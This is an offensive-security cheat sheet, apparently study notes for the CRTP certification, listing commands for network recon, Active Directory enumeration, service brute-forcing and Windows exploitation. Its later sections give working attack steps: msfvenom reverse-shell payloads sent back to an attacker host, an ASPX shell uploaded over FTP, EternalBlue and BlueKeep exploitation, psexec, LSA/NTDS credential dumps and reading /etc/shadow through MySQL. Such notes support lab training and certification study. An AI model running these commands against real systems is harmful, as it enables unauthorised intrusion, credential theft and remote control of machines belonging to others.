---
description: ToBeUpdated
---

# 📔 CRTP Cheat Sheet

## Networking

**Routing**

```bash
# Linux
ip route

# Windows
route print

# Mac OS X / Linux
netstat -r
```

**IP**

```bash
# Linux
ip a
ip -br -c a

# Windows
ipconfig /all

# Mac OS X / Linux
ifconfig
```

**ARP**

```bash
# Linux
ip neighbour

# Windows
arp -a

# Mac OS X / Linux
arp
```

**Ports**

```bash
# Linux
netstat -tunp
netstat -tulpn
ss -tnl

# Windows
netstat -ano

# Mac OS X / Linux
netstat -p tcp -p udp
lsof -n -i4TCP -i4UDP
```

**Connect and Scan**

```bash
nc -v example.com 80

openssl s_client -connect <HOST>:<PORT>
openssl s_client -connect <HOST>:<PORT> -debug
openssl s_client -connect <HOST>:<PORT> -state
openssl s_client -connect <HOST>:<PORT> -quiet

# Scan port
nc -zv <HOST> <PORT>
```

## Information Gathering

**Passive**

```bash
host <HOST>
whatweb <HOST>
whois <HOST>
whois <IP>

dnsrecon -d <HOST>

wafw00f -l
wafw00f <HOST> -a

sublist3r -d <HOST>
theHarvester -d <HOST>
theHarvester -d <HOST> -b all
```

**Google Dorks**

```bash
site:
inurl:
site:*.sitename.com
intitle:
filetype:
intitle:index of
cache:
inurl:auth_user_file.txt
inurl:passwd.txt
inurl:wp-config.bak
```

**DNS**

```bash
sudo nano /etc/hosts
dnsenum <HOST>
# e.g. dnsenum zonetransfer.me

dig <HOST>
dig axfr @DNS-server-name <HOST>

fierce --domain <HOST>
```

**Host Discovery**

```bash
## Ping scan
sudo nmap -sn <TARGET_IP/NETWORK>
## ARP scan
netdiscover -i eth1 -r <TARGET_IP/NETWORK>

# NMAP PORT SCAN
nmap <TARGET_IP>
## Skip ping
nmap -Pn <TARGET_IP>
## Host discovery + saving into file
nmap -sn <TARGET_IP>/<SUB> > hosts.txt
nmap -sn -T4 <TARGET_IP>/<SUB> -oG - | awk '/Up$/{print $2}'
## Scan all ports
nmap -p- <TARGET_IP>
## Open ports scan + saving into file
nmap -Pn -sV -T4 -A -oN ports.txt -p- -iL hosts.txt --open
## Port 80 only scan
nmap -p 80 <TARGET_IP>
## Custom list of ports scan
nmap -p 80,445,3389,8080 <TARGET_IP>
## Custom ports range scan
nmap -p1-2000 <TARGET_IP>
## Fast mode & verbose scan
nmap -F <TARGET_IP> -v
## UDP scan
nmap -sU <TARGET_IP>
## Service scan
nmap -sV <TARGET_IP>
## Service + O.S. detection scan
sudo nmap -sV -O <TARGET_IP>
## Default Scripts scan
nmap -sC <TARGET_IP>
nmap -Pn -F -sV -O -sC <TARGET_IP>
## Aggressive scan
nmap -Pn -F -A <TARGET_IP>
## Timing (T0=slow ... T5=insanely fast) scan
nmap -Pn -F -T5 -sV -O -sC <TARGET_IP> -v
## Output scan
nmap -Pn -F -oN outputfile.txt <TARGET_IP> 
nmap -Pn -F -oX outputfile.xml <TARGET_IP> 
## Output to all formats
nmap -Pn -sV -sC -O -oA outputfile <TARGET_IP>
nmap -Pn -sV -sC -O -oA outputfile <TARGET_IP>
nmap -A -oA outputfile <TARGET_IP>
```

## Footprinting & Scanning

**Network Discovery**

```bash
sudo arp-scan -I eth1 <TARGET_IP/NETWORK>
ping <TARGET_IP>
sudo nmap -sn <TARGET_IP/NETWORK>

tracert    google.com     #Windows 
traceroute google.com     #Linux

## fping
fping -I eth1 -g <TARGET_IP/NETWORK> -a
## fping with no "Host Unreachable errors"
fping -I eth1 -g <TARGET_IP/NETWORK> -a fping -I eth1 -g <TARGET_IP/NETWORK> -a 2>/dev/null
```

## Enumeration

#### **Nmap**

```bash
sudo nmap -p 445 -sV -sC -O <TARGET_IP>
nmap -sU --top-ports 25 --open <TARGET_IP>

nmap -p 445 --script smb-protocols <TARGET_IP>
nmap -p 445 --script smb-security-mode <TARGET_IP>

nmap -p 445 --script smb-enum-sessions <TARGET_IP>
nmap -p 445 --script smb-enum-sessions --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-shares <TARGET_IP>
nmap -p 445 --script smb-enum-shares --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-users --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-server-stats --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-domains--script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-groups--script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-services --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-os-discovery <TARGET_IP>

nmap -p445 --script=smb-vuln-* <TARGET_IP>
```

#### **Nmblookup**

<pre class="language-bash"><code class="lang-bash"><strong>nmblookup -A &#x3C;TARGET_IP>
</strong></code></pre>

### **User Enumeration**

#### **Kerbrute**

```bash
kerbrute userenum -d DC.LOCAL --dc 192.168.1.1 usernames.txt -o valid_ad_users.txt
#Extract valid usernames from results:
cat valid_ad_users.txt | awk -F "VALID USERNAME:\t" '{print $2}' | tr -d ' ' | sed '/^$/d' | awk -F '@' '{print $1}' | tee users.txt
#Checking for Passwords Matching Usernames Some users may have their username as their password:
kerbrute bruteuser -d DC.LOCAL -dc 192.168.1.1 usernames.txt passwords.txt
```

#### PowerView

*   Find all machines on the current domain where the current user has local admin access

    ```powershell
    Find-LocalAdminAccess -Verbose
    ```
*   Find computers where a domain admin (or specified user/group) has sessions:

    ```powershell
    Find-DomainUserLocation -Verbose
    Find-DomainUserLocation -UserGroupIdentity "RDPUsers"
    ```

#### [Invoke Session Hunter](https://github.com/Leo4j/InvokeSessionHunter)

*   List sessions on remote machines Users

    ```powershell
    . C:\AD\Tools\Invoke-SessionHunter.ps1
    Invoke-SessionHunter -FailSafe
    Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
    ```

### **Domain Enumeration**

**PowerView**

<pre class="language-powershell"><code class="lang-powershell"><strong>##PowerView.ps1
</strong><strong>#Get Domain Information, Retrieves information about the current domain.
</strong>Get-NetDomain

#Enumerate Domain Controllers
Get-NetDomainController

#Lists all Domain Controllers in the current domain, List Domain Users
Get-NetUser
<strong>
</strong><strong>#Displays all users in the domain, along with detailed attributes, Find High-Value Targets
</strong>Get-NetUser -AdminCount 1

#Lists all users flagged as administrators, Enumerate Domain Groups
Get-NetGroup

#Retrieves all domain groups. Lists members of the "Domain Admins" group.
Get-NetGroupMember -GroupName "Domain Admins"

#Locate Domain Computers. Lists all computers in the domain.
Get-NetComputer

#Analyze Trust Relationships. Displays trust relationships between domains.
Get-NetDomainTrust

#Check ACLs on AD Objects. Shows ACLs for a specific user account, resolving GUIDs to human-readable names.
Get-ObjectAcl -SamAccountName "Administrator" -ResolveGUIDs

#Find Shares on Domain Computers. Locates shared folders across domain computers.
Invoke-ShareFinder

#Identify Delegation Configurations. Finds user accounts with Service Principal Names (SPNs), often used in Kerberos-based attacks.
Get-NetUser -SPN

#-------------------------------------------
#Enumerate ACL/ACE using PowerView

#Get the ACLs associated with the specified object
Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs

#Get the ACLs associated with the specified prefix to be used for search
Get-DomainObjectAcl -SearchBase "LDAP://CN=DomainAdmins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose

#Get the ACLs associated for Domain Admins
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose

#Analyze Trust Relationships (Displays trust relationships between domains)
Get-NetDomainTrust

#Check ACLs on AD Objects  (Shows ACLs for a specific user account, resolving GUIDs to human-readable names)
Get-ObjectAcl -SamAccountName "Administrator" -ResolveGUIDs

#Search for interesting ACEs
Find-InterestingDomainAcl -ResolveGUIDs

#Get ACLs where studentx has interesting permissions
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student867"}

#Get the ACLs associated with the specified path
Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"

#-------------------------------------------
#GPO Enumeration
#Get list of GPO in current domain
Get-DomainGPO
Get-DomainGPO | select displayname
Get-DomainGPO -ComputerIdentity dcorp-student1

#Get GPOs which use Restricted Groups or groups.xml for interesting users
Get-DomainGPOLocalGroup

#Get users which are in a local group of a machine using GPO
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity dcorp-student1

#Get machines where the given user is member of a specific group
Get-DomainGPOUserLocalGroupMapping -Identity student1 -Verbose

#Get OUs in a domain
Get-DomainOU
Get-ADOrganizationalUnit -Filter * -Properties *

#List all the computers in the DevOps OU
(Get-DomainOU -Identity DevOps).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name

#Get GPO applied on an OU, read GPOname from gplink attribute from Get-NetOU
Get-DomainGPO -Identity "{0D1CC23D-1F20-4EEE...........}"
<strong>#Enumerate GPO applied on the DevOps OU
</strong>#To enumerate GPO applied on the DevOps OU, we need the name of the policy from the gplink attribute from the OU:
(Get-DomainOU -Identity DevOps).gplink
[LDAP://cn={0BF8D01C-1F62-4BDC-958C-57140B67D147},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]
#Copy the value between {} including the brackets as well:  {0BF8D01C-1F62-4BDC-958C-57140B67D147}
Get-DomainGPO -Identity '{0BF8D01C-1F62-4BDC-958C-57140B67D147}'
#Or Enumerate GPO for DevOps OU in a unique command
Get-DomainGPO -Identity (Get-DomainOU -Identity DevOps).gplink.substring(11,(Get-DomainOU -Identity DevOps).gplink.length-72)

###Domain Trust Enumeration
##To enumerate domain trusts:
#List all domain trusts for the current domain
Get-DomainTrust
#List trusts for a specific domain
Get-DomainTrust -Domain us.dollarcorp.moneycorp.local
#Using Active Directory module
Get-ADTrust
Get-ADTrust -Identity us.dollarcorp.moneycorp.local
#List external trusts in the current forest
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}

##Forest Enumeration
#To map information about the forest:
#Get details about the current forest
Get-Forest
Get-Forest -Forest eurocorp.local
#Using Active Directory module
Get-ADForest
Get-ADForest -Identity eurocorp.local
#Retrieve all domains in the current forest:
Get-ForestDomain
Get-ForestDomain -Forest eurocorp.local
(Get-ADForest).Domains
#Retrieve all global catalogs for the forest:
Get-ForestGlobalCatalog
Get-ForestGlobalCatalog -Forest eurocorp.local
Get-ADForest | Select-Object -ExpandProperty GlobalCatalogs
#Map forest trust relationships (if any exist):
Get-ForestTrust
Get-ForestTrust -Forest eurocorp.local
#Alternative using Active Directory module
Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
</code></pre>

#### BloodHound  <a href="#bloodhound-installation" id="bloodhound-installation"></a>

<pre class="language-bash"><code class="lang-bash">apt-get install bloodhound
neo4j console

#open browser and go to URL indicated by neo4j console (usually: 
http://localhost:7474

#SharpHound
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
.\SharpHound.exe -c all

<strong>#Download the resulting .zip file and upload it to BloodHound for analysis.
</strong></code></pre>

### **SMB**

[**SMB Enumeration and Common attacks**](https://dev-angelist.gitbook.io/writeups-and-walkthroughs/homemade-labs/active-directory/smb-common-attacks)

**SMBMap**

```bash
smbmap -u guest -p "" -d . -H <TARGET_IP>

smbmap -u <USER> -p '<PW>' -d . -H <TARGET_IP>

## Run a command
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -x 'ipconfig'
## List all drives
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -L
## List dir content
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -r 'C$'
## Upload a file
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --upload '/root/sample_backdoor' 'C$\sample_backdoor'
## Download a file
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\flag.txt'

smbmap -H corp-dc #List share with anonymous access
smbmap -H corp-dc -u "devan" -p "P@ssword123!" #List Devan's shares
smbmap -H corp-dc -u "devan" --prompt ##List Devan's shares without writing password in cleartext

#List a specific Share
smbmap -H corp-dc -u "devan" --prompt -r "SharedFiles"
#Check OS Version and signing status
smbmap -H corp-dc -u "devan" --prompt -v            #OS version check
smbmap -H corp-dc -u "devan" --prompt --signing     #Signing check
```

#### **SMB Connection**

```bash
# Connection
smbclient -L <TARGET_IP> -N
smbclient -L <TARGET_IP> -U <USER>
smbclient //<TARGET_IP>/<USER> -U <USER>
smbclient //<TARGET_IP>/admin -U admin
smbclient //<TARGET_IP>/public -N #NULL Session
## SMBCLIENT
smbclient //<TARGET_IP>/share_name
help
ls
get <filename>

#Lab
smbclient -L //corp-dc -N     #Anonymous Login (-N no credentials)
smbclient //corp-dc -U "dev-angelist.lab/devan%P@ssword123!"     #List Devan's shares
smbclient //corp-dc/SharedFiles -U devan
smbclient //corp-dc/SharedFiles -U "dev-angelist.lab/devan%P@ssword123!" #we can get file shared using get command
#File system prompt includes command such as: cd, dir, ls, get, put
```

#### **Netexec** <a href="#netexec" id="netexec"></a>

1.  **Enumerate Domain Machines for SMB Signing**

    ```bash
    nxc smb 192.168.1.0/24
    ```
2.  **Validate Credentials**

    ```bash
    nxc smb 192.168.1.1 -u 'jdoe' -p 'Password123'
    ```
3.  **Find Valid Machines for Connection**

    ```bash
    nxc smb 192.168.1.0/24 -u 'jdoe' -p 'Password123'
    ```
4.  **Enumerate Shared Resources**

    ```bash
    nxc smb 192.168.1.1 -u 'jdoe' -p 'Password123' --shares
    ```
5.  **Enumerate Users and Groups**

    ```bash
    nxc smb 192.168.1.1 -u 'jdoe' -p 'Password123' --users
    nxc smb 192.168.1.1 -u 'jdoe' -p 'Password123' --groups
    ```
6.  **Dump LSA and NTDS** If you have domain admin privileges:

    ```bash
    nxc smb 192.168.1.1 -u 'jdoe' -p 'Password123' --lsa
    nxc smb 192.168.1.1 -u 'jdoe' -p 'Password123' --ntds
    ```

***

#### PowerHuntShares

```powershell
Import-Module C:\AD\Tools\PowerHuntShares.psm1
Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools -HostList C:\AD\Tools\servers.txt
```

#### **RPCClient**

```bash
rpcclient -U "" -N <TARGET_IP>
## RPCCLIENT
enumdomusers
enumdomgroups
lookupnames admin
```

#### **Enum4Linux**

```bash
enum4linux -o <TARGET_IP>
enum4linux -U <TARGET_IP>
enum4linux -S <TARGET_IP>
enum4linux -G <TARGET_IP>
enum4linux -i <TARGET_IP>
enum4linux -r -u "<USER>" -p "<PW>" <TARGET_IP>
enum4linux -a -u "<USER>" -p "<PW>" <TARGET_IP>
enum4linux -U -M -S -P -G <TARGET_IP>

## NULL SESSIONS

# 1 - Use “enum4linux -n” to make sure if “<20>” exists:
enum4linux -n <TARGET_IP>
# 2 - If “<20>” exists, it means Null Session could be exploited. Utilize the following command to get more details:
enum4linux <TARGET_IP>
# 3 - If confirmed that Null Session exists, you can remotely list all share of the target:
smbclient -L WORKGROUP -I <TARGET_IP> -N -U ""
# 4 - You also can connect the remote server by applying the following command:
smbclient \\\\<TARGET_IP>\\c$ -N -U ""
# 5 - Download those files stored on the share drive:
smb: \> get file_shared.txt
```

#### **Hydra**

```bash
gzip -d /usr/share/wordlists/rockyou.txt.gz

hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> smb
```

We can use a wordlist generator tools (how [Cewl](https://app.gitbook.com/s/iS3hadq7jVFgSa8k5wRA/practical-ethical-hacker-notes/tools/cewl)), to create custom wordlists.

#### **Metasploit**

```bash
# METASPLOIT Starting
msfconsole
msfconsole -q

# METASPLOIT SMB
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_login
use auxiliary/scanner/smb/pipe_auditor

## set options depends on the selected module
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set SMBUser <USER>
set RHOSTS <TARGET_IP>
exploit
```

### **FTP**

#### **Nmap**

```
sudo nmap -p 21 -sV -sC -O <TARGET_IP>
nmap -p 21 -sV -O <TARGET_IP>

nmap -p 21 --script ftp-anon <TARGET_IP>
nmap -p 21 --script ftp-brute --script-args userdb=<USERS_LIST> <TARGET_IP>
```

#### **Ftp Client**

```
ftp <TARGET_IP>
ls
cd /../..
get <filename>
put <filename>
```

#### **Hydra**

```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <TARGET_IP> -t 4 ftp
```

### **SSH**

#### **Nmap**

```bash
# NMAP
sudo nmap -p 22 -sV -sC -O <TARGET_IP>

nmap -p 22 --script ssh2-enum-algos <TARGET_IP>
nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full <TARGET_IP>
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=<USER>" <TARGET_IP>

nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run.username=<USER>, ssh-run.password=<PW>" <TARGET_IP>

nmap -p 22 --script=ssh-brute --script-args userdb=<USERS_LIST> <TARGET_IP>
```

#### **Netcat**

```bash
# NETCAT
nc <TARGET_IP> <TARGET_PORT>
nc <TARGET_IP> 22
```

#### **SSH**

```bash
ssh <USER>@<TARGET_IP> 22
ssh root@<TARGET_IP> 22
```

#### **Hydra**

```bash
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ssh
```

#### **Metasploit**

```bash
use auxiliary/scanner/ssh/ssh_login

set RHOSTS <TARGET_IP>
set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploit
```

### **HTTP**

#### **Nmap**

```bash
sudo nmap -p 80 -sV -O <TARGET_IP>

nmap -p 80 --script=http-enum -sV <TARGET_IP>
nmap -p 80 --script=http-headers -sV <TARGET_IP>
nmap -p 80 --script=http-methods --script-args http-methods.url-path=/webdav/ <TARGET_IP>
nmap -p 80 --script=http-webdav-scan --script-args http-methods.url-path=/webdav/ <TARGET_IP>
```

#### **Alternative**

```bash
whatweb <TARGET_IP>
http <TARGET_IP>
browsh --startup-url http://<TARGET_IP>

dirb http://<TARGET_IP>
dirb http://<TARGET_IP> /usr/share/metasploit-framework/data/wordlists/directory.txt

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-head /admin/ #brute http basic auth
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-get /admin/ #brute http digest
hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed" # brute http post form
hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed:H=Cookie\: PHPSESSID=if0kg4ss785kmov8bqlbusva3v" #brute http authenticated post form

wget <TARGET_IP>
curl <TARGET_IP> | more
curl -I http://<TARGET_IP>/<DIR>
curl --digest -u <USER>:<PW> http://<TARGET_IP>/<DIR>

lynx <TARGET_IP>
```

#### **Metasploit**

```bash
use auxiliary/scanner/http/brute_dirs
use auxiliary/scanner/http/robots_txt
use auxiliary/scanner/http/http_header
use auxiliary/scanner/http/http_login
use auxiliary/scanner/http/http_version

# Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

## set options depends on the selected module
set HTTP_METHOD GET
set TARGETURI /<DIR>/

set USER_FILE <USERS_LIST>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set AUTH_URI /<DIR>/
exploit
```

### **SQL**

#### **Nmap**

```bash
sudo nmap -p 3306 -sV -O <TARGET_IP>

nmap -p 3306 --script=mysql-empty-password <TARGET_IP>
nmap -p 3306 --script=mysql-info <TARGET_IP>
nmap -p 3306 --script=mysql-users --script-args="mysqluser='<USER>',mysqlpass='<PW>'" <TARGET_IP>
nmap -p 3306 --script=mysql-databases --script-args="mysqluser='<USER>',mysqlpass='<PW>'" <TARGET_IP>
nmap -p 3306 --script=mysql-variables --script-args="mysqluser='<USER>',mysqlpass='<PW>'" <TARGET_IP>

nmap -p 3306 --script=mysql-audit --script-args="mysql-audit.username='<USER>',mysql-audit.password='<PW>',mysql-audit.filename=''" <TARGET_IP>

nmap -p 3306 --script=mysql-dump-hashes --script-args="username='<USER>',password='<PW>'" <TARGET_IP>

nmap -p 3306 --script=mysql-query --script-args="query='select count(*) from <DB_NAME>.<TABLE_NAME>;',username='<USER>',password='<PW>'" <TARGET_IP>

nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.10.10.13

## Microsoft SQL
nmap -sV -sC -p 1433 <TARGET_IP>

nmap -p 1433 --script ms-sql-info <TARGET_IP>
nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 <TARGET_IP>
nmap -p 1433 --script ms-sql-empty-password <TARGET_IP>

nmap -p 3306 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt <TARGET_IP>

nmap -p 3306 --script ms-sql-query --script-args mssql.username=<USER>,mssql.password=<PW>,ms-sql-query.query="SELECT * FROM master..syslogins" <TARGET_IP> -oN output.txt

nmap -p 3306 --script ms-sql-dump-hashes --script-args mssql.username=<USER>,mssql.password=<PW> <TARGET_IP>

nmap -p 3306 --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PW>,ms-sql-xp-cmdshell.cmd="ipconfig" <TARGET_IP>

nmap -p 3306 --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PW>,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" <TARGET_IP>
```

```bash
# MYSQL
mysql -h <TARGET_IP> -u <USER>
mysql -h <TARGET_IP> -u root

# Mysql client
help
show databases;
use <DB_NAME>;
select count(*) from <TABLE_NAME>;
select load_file("/etc/shadow");
```

#### **Hydra**

```bash
hydra -l <USER> -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <TARGET_IP> mysql
```

#### **Metasploit**

```bash
use auxiliary/scanner/mysql/mysql_schemadump
use auxiliary/scanner/mysql/mysql_writable_dirs
use auxiliary/scanner/mysql/mysql_file_enum
use auxiliary/scanner/mysql/mysql_hashdump
use auxiliary/scanner/mysql/mysql_login

## MS Sql
use auxiliary/scanner/mssql/mssql_login
use auxiliary/admin/mssql/mssql_enum
use auxiliary/admin/mssql/mssql_enum_sql_logins
use auxiliary/admin/mssql/mssql_exec
use auxiliary/admin/mssql/mssql_enum_domain_accounts

# Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

## set options depends on the selected module
set USERNAME root
set PASSWORD ""

set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set VERBOSE false
set PASSWORD ""

set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
set PASSWORD ""

set USER_FILE /root/Desktop/wordlist/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set STOP_ON_SUCCESS true

set CMD whoami
exploit
```

### **SMTP**

#### **Nmap**

```bash
sudo nmap -p 25 -sV -sC -O <TARGET_IP>

nmap -sV -script banner <TARGET_IP>
```

```bash
nc <TARGET_IP> 25
telnet <TARGET_IP> 25

# TELNET client - check supported capabilities
HELO attacker.xyz
EHLO attacker.xyz
```

```bash
smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t <TARGET_IP>
```

#### **Metasploit**

```bash
# METASPLOIT
service postgresql start && msfconsole -q

# Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

use auxiliary/scanner/smtp/smtp_enum
```

## **Windows Exploitation**

### **IIS WebDav / FTP**

```bash
davtest -url <URL>
davtest -auth <USER>:<PW> -url http://<TARGET_IP>/webdav

cadaver [OPTIONS] <URL>

nmap -p 80 --script http-enum -sV <TARGET_IP>
```

```bash
msfvenom -p <PAYLOAD> LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f <file_type> > shell.asp

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f asp > shell.asp
```

```bash
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt <TARGET_IP> http-get /webdav/
```

```bash
## METASPLOIT
# Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

use exploit/multi/handler
use exploit/windows/iis/iis_webdav_upload_asp

set payload windows/meterpreter/reverse_tcp
set LHOST <LOCAL_HOST_IP>
set LPORT <LOCAL_PORT>

set HttpUsername <USER>
set HttpPassword <PW>
set PATH /webdav/metasploit.asp
```

```bash
# Targeting IIS/FTP
nmap -sV -sC -p21,80 <TARGET_IP>
## Try anonymous:anonymous
ftp <TARGET_IP>

## Brute-force FTP
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt <TARGET_IP> ftp

hydra -l administrator -P /usr/share/wordlists/metasploit/unix_users.txt <TARGET_IP> ftp -I
hydra -l <USER> -P /usr/share/wordlists/metasploit/unix_users.txt <TARGET_IP> ftp -I

## Generate an .asp reverse shell payload
cd <TARGET>/
ip -br -c a
msfvenom -p windows/shell/reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f asp > shell.aspx

## FTP Login with <USER>
ftp <TARGET_IP>
put shell.aspx

## msfconsole
use multi/handler
set payload windows/shell/reverse_tcp
set LHOST <LOCAL_IP>
set LPORT <LOCAL_PORT>

## Open http://<TARGET_IP>/shell.aspx . A reverse shell may be received.
```

**OPENSSH**

```bash
# Targeting OPENSSH
nmap -sV -sC -p 22 <TARGET_IP>

searchsploit OpenSSH 7.1

## Brute-force SSH
hydra -l administrator /usr/share/wordlists/metasploit/unix_users.txt <TARGET_IP> ssh
hydra -l <USER> -P /usr/share/wordlists/metasploit/unix_users.txt <TARGET_IP> ssh

## SSH Login with <USER>
ssh <USER>@<TARGET_IP>

## Win
bash
net localgroup administrators
whoami /priv

# msfconsole
use auxiliary/scanner/ssh/ssh_login
setg RHOST <TARGET_IP>
setg RHOSTS <TARGET_IP>
set USERNAME <USER>
set PASSWORD <PW>
run
session 1
# CTRL+Z to background
sessions -u 1
```

**SMB**

```bash
# Targeting SMB
nmap -sV -sC -p 445 <TARGET_IP>
nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>

## Brute-force SMB
hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt <TARGET_IP> smb
hydra -l <USER> -P /usr/share/wordlists/metasploit/unix_passwords.txt <TARGET_IP> smb

## Enumeration
smbclient -L <TARGET_IP> -U <USER>
smbmap -u <USER> -p <PW> -H <TARGET_IP>
enum4linux -u <USER> -p <PW> -U <TARGET_IP>

## msfconsole
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS <TARGET_IP>
set SMBUser <USER>
set SMBPass <PW>
run

## SMB Login with <USER>
locate psexec.py
cp /usr/share/doc/python3-impacket/examples/psexec.py .
chmod +x psexec.py
python3 psexec.py Administrator@<TARGET_IP>
python3 psexec.py <USER>@<TARGET_IP>

# msfconsole - Meterpreter
use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set SMBUser Administrator
set SMBPass <PW>
set payload windows/x64/meterpreter/reverse_tcp
run

# Without <USER>:<PW>, exploit a vulnerability, e.g. EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
run

# Other modules
use auxiliary/scanner/smb/smb_login
use exploit/windows/smb/psexec
use exploit/windows/smb/ms17_010_eternalblue

set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false

## Manual Exploit - AutoBlue
cd
mkdir tools
cd /home/kali/tools
sudo git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git 
cd AutoBlue-MS17-010
pip install -r requirements.txt

cd shellcode
chmod +x shell_prep.sh
./shell_prep.sh
# LHOST = Host Kali Linux IP
# LPORT = Port Kali will listen for the reverse shell

nc -nvlp 1234 # On attacker VM

cd ..
chmod +x eternalblue_exploit7.py
python eternalblue_exploit7.py <TARGET_IP> shellcode/sc_x64.bin
```

**MYSQL**

```bash
# Targeting MYSQL (Wordpress)
nmap -sV -sC -p 3306,8585 <TARGET_IP>

searchsploit MySQL 5.5

## Brute-force MySql - msfconsole
msfconsole -q
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <TARGET_IP>
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
run

## MYSQL Login with <USER>
mysql -u root -p -h <TARGET_IP>

show databases;
use <db>;
show tables;
select * from <table>;

## msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
run

sysinfo
cd /
cd wamp
dir
cd www\\wordpress
cat wp-config.php
shell
```

#### **SMB**

#### **RDP**

```bash
# RDP
nmap -sV <TARGET_IP>
```

```bash
## METASPLOIT
# Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

use auxiliary/scanner/rdp/rdp_scanner
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep

set RPORT <PORT>

# ! Kernel crash may be caused !
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

show targets
set target <NUMBER>
set GROOMSIZE 50
```

```bash
